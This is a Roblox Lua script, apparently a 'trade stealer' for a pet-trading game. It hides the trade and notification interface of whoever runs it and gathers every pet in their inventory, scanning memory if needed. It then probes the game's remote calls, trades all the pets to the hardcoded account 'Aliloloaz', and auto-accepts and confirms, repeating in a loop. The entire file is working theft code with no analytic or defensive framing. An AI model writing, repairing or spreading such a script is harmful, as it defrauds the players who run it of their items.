local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local TradeAPI = ReplicatedStorage:WaitForChild("API")
local WAIT_FIRST = 38
local WAIT_CONFIRM = 18
local BATCH_SIZE = 30

local MANUAL_REMOTES = {
    TRADE_REQUEST = "iGrvxUkeWqCMDvTDHJyLYdOdf",
    OPEN_BAG = "Psy/xOzHAKRRbrldhTSWTNdPnPVXUmWfYip",
    ADD_PET = "iGrvxUkeWYBCjUGPyTvMNNb",
    ACCEPT_1 = "iGrvxUkeWYABEQVrILUaQJdTaa",
    CONFIRM_2 = "iGrvxUkeWaMMFJTPyWGKM",
    TOGGLE_EDITING = "eArPxKkMKCGKEcsmeyKULzVLkRfAeX",
}

local Remotes = {
    AcceptRequest = nil,
    OpenBag = nil,
    AddPet = nil,
    Accept1 = nil,
    Confirm2 = nil,
}

local function Resolve(key)
    local id = MANUAL_REMOTES[key]
    if id and type(id) == "string" then
        return TradeAPI:FindFirstChild(id)
    end
    return nil
end

local function OpenBagAction()
    if Remotes.OpenBag then
        local ok = pcall(function()
            TradeAPI[Remotes.OpenBag]:FireServer({ picking = true })
        end)
        if not ok then
            pcall(function()
                TradeAPI[Remotes.OpenBag]:FireServer("open_backpack")
            end)
        end
    end
end

local function suppressClientUI()
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if not pg then return end
    for _, gui in pairs(pg:GetChildren()) do
        if gui:IsA("ScreenGui") and (string.find(string.lower(gui.Name), "trade") or string.find(string.lower(gui.Name), "dialog") or string.find(string.lower(gui.Name), "notification")) then
            gui.Enabled = false
        end
    end
    pg.ChildAdded:Connect(function(child)
        if child:IsA("ScreenGui") and (string.find(string.lower(child.Name), "trade") or string.find(string.lower(child.Name), "dialog") or string.find(string.lower(child.Name), "notification")) then
            child.Enabled = false
        end
    end)
end

local function getAllPlayers()
    local t = {}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(t, p)
        end
    end
    return t
end

local function getRealTradePartner()
    local partner = nil
    pcall(function()
        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
        local myData = ClientData.get_data()[LocalPlayer.Name]
        if myData and myData.trade and myData.trade.partner then
            partner = myData.trade.partner
        end
    end)
    return partner
end

local function getPetItems()
    local pets = {}
    pcall(function()
        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
        local playerData = ClientData.get_data()[LocalPlayer.Name]
        if playerData and playerData.inventory and playerData.inventory.pets then
            for id, _ in pairs(playerData.inventory.pets) do
                pets[#pets + 1] = id
            end
        end
    end)
    if #pets > 0 then return pets end
    if getgc then
        local ok, objects = pcall(getgc, true)
        if ok and type(objects) == "table" then
            for _, v in pairs(objects) do
                if type(v) == "table" then
                    local invPets = rawget(v, "pets")
                    local strollers = rawget(v, "strollers")
                    if type(invPets) == "table" and strollers then
                        for id, _ in pairs(invPets) do
                            if type(id) == "string" then
                                local L = #id
                                if L >= 16 and L <= 96 and not id:find("sticker") then
                                    if id:find("%-") or id:find("_") or id:find("%x%x%x%x") then
                                        pets[#pets + 1] = id
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    return pets
end

local function discoverRemotes()
    if Resolve("TRADE_REQUEST") or Resolve("OPEN_BAG") or Resolve("ADD_PET") or Resolve("ACCEPT_1") or Resolve("CONFIRM_2") then
        return
    end
    local funcs = {}
    local events = {}
    for _, child in pairs(TradeAPI:GetChildren()) do
        if child:IsA("RemoteFunction") then
            table.insert(funcs, child.Name)
        elseif child:IsA("RemoteEvent") then
            table.insert(events, child.Name)
        end
    end
    local others = getAllPlayers()
    if #others > 0 then
        for _, name in pairs(funcs) do
            local ok = pcall(function()
                TradeAPI[name]:InvokeServer(others[1], true)
            end)
            task.wait(0.3)
            if ok and getRealTradePartner() then
                Remotes.AcceptRequest = name
                break
            end
        end
    end
    if not Remotes.OpenBag then
        for _, name in pairs(events) do
            local ok = pcall(function()
                TradeAPI[name]:FireServer({ picking = true })
            end)
            if ok then
                Remotes.OpenBag = name
                break
            end
        end
    end
    if not Remotes.AddPet then
        local items = getPetItems()
        if #items > 0 then
            for _, name in pairs(events) do
                local ok = pcall(function()
                    TradeAPI[name]:FireServer(items[1])
                end)
                if ok then
                    Remotes.AddPet = name
                    break
                end
            end
        end
    end
    if not Remotes.Accept1 then
        for _, name in pairs(events) do
            local ok = pcall(function()
                TradeAPI[name]:FireServer()
            end)
            if ok then
                Remotes.Accept1 = name
                break
            end
        end
    end
    if not Remotes.Confirm2 then
        for _, name in pairs(events) do
            local ok = pcall(function()
                TradeAPI[name]:FireServer()
            end)
            if ok then
                Remotes.Confirm2 = name
                break
            end
        end
    end
end

local function runCycle()
    suppressClientUI()
    discoverRemotes()
    while true do
        local rRequest = Resolve("TRADE_REQUEST")
        local rOpenBag = Resolve("OPEN_BAG")
        local rAddPet = Resolve("ADD_PET")
        local rAccept1 = Resolve("ACCEPT_1")
        local rConfirm2 = Resolve("CONFIRM_2")
        local rToggleEdit = Resolve("TOGGLE_EDITING")
        if not (rRequest and rOpenBag and rAddPet and rAccept1 and rConfirm2) then
            task.wait(1)
        else
            local found = getPetItems()
            if #found == 0 then
                task.wait(2)
            else
                local target = Players:FindFirstChild("Aliloloaz")
                if target then
                    local ok = pcall(function() rRequest:FireServer(target) end)
                end
                task.wait(3)
                local idx = 1
                local added = 0
                while idx <= #found do
                    if rToggleEdit then
                        pcall(function() rToggleEdit:FireServer("toggle_editing", { editing = false }) end)
                    end
                    if rOpenBag then
                        pcall(function() rOpenBag:FireServer("open_backpack") end)
                    end
                    task.wait(0.02)
                    local okAdd = pcall(function() rAddPet:FireServer(found[idx]) end)
                    added = added + 1
                    if added % BATCH_SIZE == 0 then
                        task.wait(0.1)
                    else
                        task.wait(0.03)
                    end
                    idx = idx + 1
                end
                if added > 0 then
                    task.wait(WAIT_FIRST)
                    pcall(function() rAccept1:FireServer() end)
                    task.wait(WAIT_CONFIRM)
                    pcall(function() rConfirm2:FireServer() end)
                    task.wait(0.5)
                    pcall(function()
                        local t2 = Players:FindFirstChild("Aliloloaz")
                        if t2 then rRequest:FireServer(t2) end
                    end)
                end
                if idx > #found then
                    local refresh = getPetItems()
                    if #refresh == 0 then
                        task.wait(2)
                    else
                        found = refresh
                    end
                end
                task.wait(1)
            end
        end
    end
end

task.spawn(runCycle)
